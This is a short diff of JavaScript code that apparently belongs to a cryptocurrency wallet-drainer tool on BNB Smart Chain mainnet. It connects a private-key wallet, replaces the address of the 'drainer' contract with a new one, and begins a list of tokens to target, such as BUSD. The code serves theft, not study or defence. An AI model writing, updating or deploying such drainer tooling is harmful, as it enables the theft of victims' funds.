@@ -20,7 +20,7 @@ const BSC_MAINNET_CHAIN_ID = 56;
 const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.bnbchain.org/", BSC_MAINNET_CHAIN_ID);
 const wallet = new ethers.Wallet(process.env.PRIVATE_KEY || "YOUR_PRIVATE_KEY_HERE", provider);
 
-const drainerContractAddress = "0xd58eeFeF184192Ed19c5b1DfEc06A082f84c66d3"; // Ensure this is deployed on mainnet
+const drainerContractAddress = "0xFc23Cc2C8d25c515B2a920432e5EBf6d018e3403"; // Ensure this is deployed on mainnet
 
 const tokenList = [
   { symbol: "BUSD", address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", decimals: 18 },
